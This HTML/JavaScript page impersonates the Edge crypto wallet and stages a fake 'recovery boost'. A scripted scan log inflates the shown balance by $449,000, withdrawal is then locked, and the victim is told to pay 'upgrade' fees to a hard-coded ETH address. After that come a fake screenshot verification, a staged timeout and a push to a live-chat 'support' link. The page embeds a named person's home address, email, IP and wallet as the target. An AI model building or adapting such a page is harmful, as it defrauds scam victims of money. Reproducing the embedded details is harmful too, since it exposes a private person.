<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Edge Wallet | Recovery Boost</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    :root {
      --edge-primary: #0A74DA;
      --edge-dark: #1D2330;
      --edge-light: #f3f6fa;
      --edge-green: #1fd1a4;
      --edge-red: #e24c4b;
      --edge-yellow: #ffc400;
      --card-radius: 18px;
      --transition: all 0.3s cubic-bezier(.4,0,.2,1);
    }
    body {
      margin: 0;
      padding: 0;
      background: var(--edge-light);
      font-family: 'Roboto', Arial, sans-serif;
      color: var(--edge-dark);
      min-height: 100vh;
      overflow-x: hidden;
    }
    .centered {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .edge-card {
      background: #fff;
      box-shadow: 0 2px 20px 0 rgba(34,43,61,.11);
      border-radius: var(--card-radius);
      padding: 2rem 1.5rem;
      max-width: 380px;
      width: 95vw;
      margin: 1.5rem auto;
      transition: var(--transition);
    }
    .edge-logo {
      max-width: 70px;
      margin-bottom: 1.2rem;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    h1, h2, h3, h4 {
      font-weight: 700;
      margin: 0.6em 0 0.3em 0;
      letter-spacing: -.01em;
    }
    .dashboard-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: .3em;
    }
    .eth-balance {
      font-size: 2.4em;
      font-weight: 700;
      letter-spacing: -0.02em;
      color: #1fd1a4;
      margin: 0.2em 0 0.1em 0;
      text-shadow: 0 2px 8px #f6fcfa;
      transition: color .4s;
    }
    .eth-balance.locked {
      color: var(--edge-red);
      text-shadow: 0 2px 8px #fae6e6;
    }
    .currency-label {
      font-size: 1.1em;
      color: #444;
      font-weight: 500;
    }
    .dashboard-img {
      width: 100%;
      border-radius: var(--card-radius);
      margin: 1em 0;
      object-fit: cover;
      box-shadow: 0 1px 8px 0 rgba(34,43,61,.07);
      background: #111;
    }
    .withdraw-section {
      margin-top: 2em;
      position: relative;
      text-align: center;
    }
    .locked-banner {
      background: #fff0f0;
      color: #b13e3e;
      font-weight: 700;
      padding: 1em 0.8em;
      text-align: center;
      border-radius: 12px;
      font-size: 1.13em;
      margin-bottom: 1.4em;
      border: 2px solid #ffc4c4;
      box-shadow: 0 2px 8px #fbe3e3;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: .5em;
    }
    .withdraw-locked-btn {
      background: var(--edge-red);
      color: #fff;
      border: none;
      border-radius: 9px;
      padding: 0.9em 2em;
      font-size: 1.08em;
      font-weight: 700;
      margin-top: 1em;
      box-shadow: 0 2px 6px rgba(0,0,0,0.07);
      cursor: not-allowed;
      opacity: 0.93;
      transition: opacity .25s;
      position: relative;
      outline: none;
      display: block;
      width: 100%;
    }
    .withdraw-locked-btn span {
      margin-left: .6em;
      font-size: 1em;
    }
    /* Floating Support Button */
    #support-float-btn {
      position: fixed;
      right: 18px;
      bottom: 22px;
      z-index: 9999;
      background: #0A74DA;
      color: #fff;
      border-radius: 50%;
      width: 56px;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2em;
      box-shadow: 0 4px 18px rgba(0,0,0,0.14);
      text-decoration: none;
      transition: background 0.2s;
      cursor: pointer;
    }
    #support-float-btn:hover {
      background: #195593;
    }
    /* Floating Upgrade Button */
    #upgrade-float-btn {
      position: fixed;
      top: 20px;
      right: 22px;
      z-index: 9999;
      background: #e24c4b;
      color: #fff;
      border-radius: 14px;
      width: 46px;
      height: 46px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.18em;
      font-weight: 700;
      box-shadow: 0 3px 16px rgba(226,76,75,0.15);
      text-decoration: none;
      cursor: pointer;
      border: none;
      outline: none;
      transition: background 0.15s, box-shadow 0.15s;
    }
    #upgrade-float-btn:hover {
      background: #b13e3e;
      box-shadow: 0 3px 20px rgba(226,76,75,0.18);
    }
    #upgrade-float-btn span {
      display: none;
    }
    @media (min-width: 400px) {
      #upgrade-float-btn span {
        display: inline;
        margin-left: .5em;
        font-size: .99em;
        font-weight: 600;
        letter-spacing: -.01em;
      }
    }
    /* Popup */
    .popup-modal, .modal-bg {
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      z-index: 1001;
      background: rgba(20,32,54,0.12);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .popup-card {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 6px 30px 0 rgba(20,32,54,0.13);
      padding: 2em 1.5em;
      max-width: 400px;
      width: 96vw;
      animation: popupin .25s;
    }
    @keyframes popupin { from {transform:scale(0.97) translateY(20px);} to {transform:scale(1) translateY(0);} }
    .small-btn {
      background: var(--edge-primary);
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 0.55em 1.2em;
      font-size: 1em;
      font-weight: 600;
      margin: 0.7em auto 0.4em auto;
      display: block;
      cursor: pointer;
      transition: background 0.18s;
    }
    .small-btn:active { background: #195593; }
    .upgrade-card {
      background: #f6fafe;
      border-radius: 12px;
      padding: 1.2em 1em;
      box-shadow: 0 1px 8px 0 rgba(34,43,61,.06);
      margin-bottom: 1.2em;
    }
    .upgrade-btn {
      background: var(--edge-primary);
      color: #fff;
      padding: 0.7em 1.6em;
      border-radius: 7px;
      border: none;
      font-size: 1em;
      font-weight: 600;
      margin-top: 0.7em;
      cursor: pointer;
      transition: background 0.18s;
      outline: none;
      display: inline-block;
    }
    .upgrade-btn:active {
      background: #195593;
    }
    .upgrade-level {
      margin: .7em 0;
      padding: .7em;
      border-radius: 8px;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1.5px solid #e0e0e0;
      transition: border 0.2s;
      gap: .5em;
    }
    .upgrade-level.selected {
      border: 2px solid var(--edge-primary);
      background: #eafff8;
    }
    .upgrade-spinner {
      width: 44px;
      height: 44px;
      border: 4px solid #eaf1fa;
      border-top: 4px solid var(--edge-primary);
      border-radius: 50%;
      animation: spin 1.1s linear infinite;
      margin: 2em auto 1em auto;
      display: block;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    /* Other styles omitted for brevity, same as before */
    @media (max-width: 500px) {
      .edge-card { padding: 1.2rem 0.7rem; }
      #support-float-btn { width: 44px; height: 44px; font-size: 1.4em; }
      #upgrade-float-btn { width: 38px; height: 38px; font-size: .98em; }
      #upgrade-float-btn span { display: none !important; }
    }
  </style>
</head>
<body>
<div id="app"></div>
<!-- Floating Support Button -->
<a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings"
   target="_blank"
   id="support-float-btn"
   title="Live Support">
  üí¨
</a>
<!-- Floating Upgrade Button -->
<button id="upgrade-float-btn" title="Upgrade Account">
  ‚¨ÜÔ∏è
  <span>Upgrade</span>
</button>
<script>
const EDGE_LOGO_URL = "https://edge.app/_nuxt/img/edge-logo.7e5c3b2.svg";
const DASHBOARD_IMG = "image1"; // Your uploaded Edge Wallet screenshot filename
const RECOVERY_TX_AMOUNT = 449000;
const RECOVERY_ETH = 125.81;
const INIT_BALANCE = 30000;
const INIT_ETH = 9.2;
const RECOVERY_LOGS = [
  "# Checking security of connection... PASSED",
  "# Country - United States",
  "# User Location - 2113 Sherbrooke Circle, Virginia Beach, VA 23454",
  "# Username - Randi Perrone-Kerfoot",
  "# Email - Verified (randi.pk@example.com)",
  "# IP Address - 192.0.2.24 (Secure)",
  "# Device Status - No malware detected",
  "# Network Integrity - Stable (No packet loss)",
  "# ETH Address - 0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc",
  "# Wallet Balance - Verified (Encrypted)",
  "# Two-Factor Authentication - Enabled",
  "# Account Recovery Tokens - Validated",
  "# Encryption Status - AES-256 Verified",
  "# Scan Completed - No security breaches detected"
];
const RECOVERY_LOG_TIMES = [
  "00:15", "00:28", "00:36", "00:44", "00:53", "01:05",
  "01:18", "01:30", "01:42", "01:58", "02:15", "02:32", "02:50", "03:00"
];
const UPGRADE_LEVELS = [
  {name: "Level 1", limit: 30000, cost: 0, desc: "Limit Exceeded", locked: true},
  {name: "Level 2", limit: 300000, cost: 700, desc: "Upgrade to process $300,000", locked: false},
  {name: "Level 3", limit: 449000, cost: 1100, desc: "Max Balance Access", locked: false},
];
const UPGRADE_ADDRESS = "0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4";
const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";
const USER = {
  name: "Randi Perrone Kerfoot",
  username: "Randi Perrone-Kerfoot",
  eth: "0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc",
  country: "United States üá∫üá∏",
  address: "2113 Sherbrooke Circle, Virginia Beach, VA 23454",
  email: "randi.pk@example.com",
  ip: "192.0.2.24"
};

let state = {
  step: "welcome", // welcome|dashboard|recoveryModal|raiderScan|locked|upgrade|pay|upload|verifying|timeout
  dashboard: {
    balance: INIT_BALANCE,
    eth: INIT_ETH
  },
  recoveryDone: false,
  locked: false,
  upgradeLevel: 1,
  selectedUpgrade: null,
  copySuccess: false,
  uploadImg: null,
  verifying: false,
  verifyStart: 0
};

function render() {
  const app = document.getElementById('app');
  app.innerHTML = '';

  if (state.step === "welcome") renderWelcome(app);
  else if (state.step === "dashboard") renderDashboard(app);
  else if (state.step === "recoveryModal") renderRecoveryModal(app);
  else if (state.step === "raiderScan") renderRaiderScan(app);
  else if (state.step === "locked") { renderDashboard(app, true); renderLockedBanner(app); }
  else if (state.step === "upgrade") renderUpgradeModal(app);
  else if (state.step === "pay") renderPayModal(app);
  else if (state.step === "upload") renderUploadModal(app);
  else if (state.step === "verifying") renderVerifyingModal(app);
  else if (state.step === "timeout") renderTimeoutModal(app);

  // Upgrade floating button always visible (except on upgrade/pay/upload/verify)
  const upgradeBtn = document.getElementById("upgrade-float-btn");
  if (["upgrade","pay","upload","verifying","timeout"].includes(state.step)) {
    upgradeBtn.style.display = "none";
  } else if (state.locked || state.step === "locked" || state.dashboard.balance > INIT_BALANCE) {
    upgradeBtn.style.display = "flex";
  } else {
    upgradeBtn.style.display = "none";
  }
  upgradeBtn.onclick = () => {
    state.step = "upgrade";
    render();
  };
}

function renderWelcome(app) {
  const card = document.createElement('div');
  card.className = 'edge-card centered';
  card.innerHTML = `
    <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
    <h2 style="margin-top:0.5em; font-size:1.25em;">Welcome, <span style="color:var(--edge-primary);">${USER.name}</span></h2>
    <button class="button" id="proceedBtn" style="margin-top:2em;">PROCEED TO MY DASHBOARD</button>
  `;
  app.appendChild(card);
  card.querySelector('#proceedBtn').onclick = () => {
    state.step = "dashboard";
    setTimeout(()=>{ render(); }, 300);
    setTimeout(()=>{ state.step = "recoveryModal"; render(); }, 1200);
  };
}

function renderDashboard(app, isLocked) {
  const card = document.createElement('div');
  card.className = 'edge-card';
  card.style.position = "relative";
  const isAccountLocked = state.locked || state.step === "locked" || state.dashboard.balance > INIT_BALANCE;
  card.innerHTML = `
    <div class="dashboard-header">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet" style="margin-bottom:0;">
      <h2>Edge Wallet Dashboard</h2>
    </div>
    <img src="image1" alt="Dashboard" class="dashboard-img">
    <div class="eth-balance${isAccountLocked ? " locked" : ""}">
      $${state.dashboard.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}
    </div>
    <div class="currency-label">Ethereum (${state.dashboard.eth} ETH)</div>
    <div class="withdraw-section">
      <button class="withdraw-locked-btn" disabled>
        Withdraw <span>üîí</span>
        <div style="display:block;font-size:.97em;color:#fff;margin-top:.2em;">
          ${isAccountLocked ? "Account is currently locked. Please upgrade to proceed." : ""}
        </div>
      </button>
    </div>
  `;
  app.appendChild(card);
}

function renderRecoveryModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card">
      <h3 style="margin-bottom:1em;">Dear user</h3>
      <div style="font-size:1.08em; margin-bottom:1.2em;">
        You have an <b>Unfinished Recovery Request</b>
      </div>
      <button class="button" id="boostBtn">Boost Up Recovery</button>
    </div>
  `;
  app.appendChild(modal);
  modal.querySelector('#boostBtn').onclick = () => {
    state.step = "raiderScan";
    render();
  };
}

function renderRaiderScan(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card" style="min-width:290px;">
      <h3 style="color:var(--edge-primary);margin-bottom:0.5em;">UPDATING REQUEST‚Ä¶</h3>
      <div id="raiderScanLog" class="raider-log"></div>
    </div>
  `;
  app.appendChild(modal);

  let idx = 0, logView = modal.querySelector('#raiderScanLog');
  logView.innerHTML = '';
  function appendLog() {
    if (idx < RECOVERY_LOGS.length) {
      logView.innerHTML += `[${RECOVERY_LOG_TIMES[idx]}] ${RECOVERY_LOGS[idx]}<br>`;
      logView.scrollTop = logView.scrollHeight;
      idx++;
      let nextDelay = [700,800,900,1200,1400][Math.floor(Math.random()*5)] + 300;
      setTimeout(appendLog, nextDelay);
    } else {
      setTimeout(() => {
        state.dashboard.balance += RECOVERY_TX_AMOUNT;
        state.dashboard.eth = +(state.dashboard.eth + RECOVERY_ETH).toFixed(2);
        state.locked = true;
        state.step = "locked";
        render();
      }, 1200);
    }
  }
  setTimeout(appendLog, 1150);
}

function renderLockedBanner(app) {
  const locked = document.createElement('div');
  locked.className = 'locked-banner';
  locked.innerHTML = `
    <span style="font-size:1.38em;">üîí</span>
    <span>
      <b>Account Locked:</b> Due to low verification status. Kindly upgrade your account to proceed further.
    </span>
  `;
  app.appendChild(locked);
}

function renderUpgradeModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  let levelsHtml = "";
  UPGRADE_LEVELS.forEach((level, i) => {
    levelsHtml += `
      <div class="upgrade-level ${state.selectedUpgrade===i?'selected':''}">
        <div>
          <b>${level.name}</b>
          <div style="font-size:.97em; margin-top:.1em;">
            ${level.desc}
            ${level.locked ? `<span class="level-current">(Current)</span>` : ""}
          </div>
        </div>
        <div>
          <span style="font-weight:600;color:var(--edge-green);">$${level.limit.toLocaleString()}</span>
          ${level.cost ? `<span style="font-size:.98em; color:#888; margin-left:1em;">Fee: $${level.cost}</span>` : ""}
        </div>
        ${!level.locked ? `<button class="upgrade-btn" data-upgrade="${i}">Upgrade</button>` : ""}
      </div>
    `;
  });
  modal.innerHTML = `
    <div class="popup-card">
      <h3>Upgrade Verification Level</h3>
      <div class="upgrade-card">
        ${levelsHtml}
      </div>
      <button class="button" id="closeUpgrade" style="background:#ccc;color:#444;">Close</button>
    </div>
  `;
  app.appendChild(modal);

  modal.querySelectorAll('.upgrade-btn').forEach(btn=>{
    btn.onclick = (e) => {
      let idx = +btn.getAttribute('data-upgrade');
      state.selectedUpgrade = idx;
      state.step = "pay";
      render();
    }
  });
  modal.querySelector('#closeUpgrade').onclick = () => {
    state.step = "locked";
    render();
  };
}

function renderPayModal(app) {
  const idx = state.selectedUpgrade;
  const level = UPGRADE_LEVELS[idx];
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card">
      <h3>Upgrade to ${level.name}</h3>
      <div style="font-size:1.09em; margin-bottom:1em;">
        <b>To access $${level.limit.toLocaleString()}:</b><br>
        Please pay <span style="color:var(--edge-green);font-weight:700;">$${level.cost} USD</span> in ETH points.
      </div>
      <div style="margin-bottom:1em;">
        Payment Address:<br>
        <span style="font-size:1.02em;font-weight:500;letter-spacing:0.02em">${UPGRADE_ADDRESS}</span>
        <button class="copy-btn" id="copyUpgradeBtn">Copy</button>
        <span id="copySuccess" style="margin-left:.6em; color:var(--edge-green); font-size:0.99em; display:none;">Copied!</span>
      </div>
      <button class="button" id="havePaidBtn" style="margin-bottom:.5em;">I have paid</button>
      <button class="button" id="closePay" style="background:#ccc;color:#444;">Back</button>
    </div>
  `;
  app.appendChild(modal);

  modal.querySelector('#closePay').onclick = () => {
    state.step = "upgrade";
    render();
  };
  modal.querySelector('#havePaidBtn').onclick = () => {
    state.step = "upload";
    render();
  };
  modal.querySelector('#copyUpgradeBtn').onclick = () => {
    navigator.clipboard.writeText(UPGRADE_ADDRESS);
    modal.querySelector('#copySuccess').style.display = 'inline';
    setTimeout(()=>{ modal.querySelector('#copySuccess').style.display='none'; }, 1400);
  };
}

function renderUploadModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card">
      <h3>Upload Payment Screenshot</h3>
      <div style="margin-bottom:1.2em;">
        <input type="file" id="screenshotInput" accept="image/*">
        <div id="uploadedPreview"></div>
      </div>
      <button class="button" id="submitScreenshot" disabled>Submit for Verification</button>
      <button class="button" id="closeUpload" style="background:#ccc;color:#444;">Back</button>
    </div>
  `;
  app.appendChild(modal);

  const fileInput = modal.querySelector('#screenshotInput');
  const preview = modal.querySelector('#uploadedPreview');
  const submitBtn = modal.querySelector('#submitScreenshot');
  fileInput.onchange = function() {
    const file = fileInput.files[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = function(e) {
        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #e6eaf7;">`;
        state.uploadImg = e.target.result;
        submitBtn.disabled = false;
      };
      reader.readAsDataURL(file);
    }
  };
  submitBtn.onclick = () => {
    state.step = "verifying";
    state.verifyStart = new Date().getTime();
    render();
    setTimeout(()=>{ state.step = "timeout"; render(); }, 4200);
  };
  modal.querySelector('#closeUpload').onclick = () => {
    state.step = "pay";
    render();
  };
}

function renderVerifyingModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card progress-modal">
      <span class="upgrade-spinner"></span>
      <h3>Verification in progress</h3>
      <div style="margin-top:0.5em; color:#888;">
        Please wait...<br>
        <span style="font-size:.97em;">Estimated time: 3 hours</span>
      </div>
    </div>
  `;
  app.appendChild(modal);
}

function renderTimeoutModal(app) {
  const modal = document.createElement('div');
  modal.className = 'popup-modal';
  modal.innerHTML = `
    <div class="popup-card progress-modal">
      <span style="font-size:2em; color:var(--edge-yellow);">‚è∞</span>
      <h3 style="margin-bottom:0.4em;">Verification Timeout</h3>
      <div style="font-size:1.05em; margin-bottom:1.9em;">
        Contact support for more info regarding this issue.
      </div>
      <div class="support-link">
        <a href="${SUPPORT_URL}" target="_blank">Contact Support</a>
      </div>
      <button class="button" id="toLocked" style="margin-top:2em;">Return to Dashboard</button>
    </div>
  `;
  app.appendChild(modal);
  modal.querySelector('#toLocked').onclick = () => {
    state.step = "locked";
    render();
  };
}

window.addEventListener('DOMContentLoaded', () => { render(); });
</script>
</body>
</html>
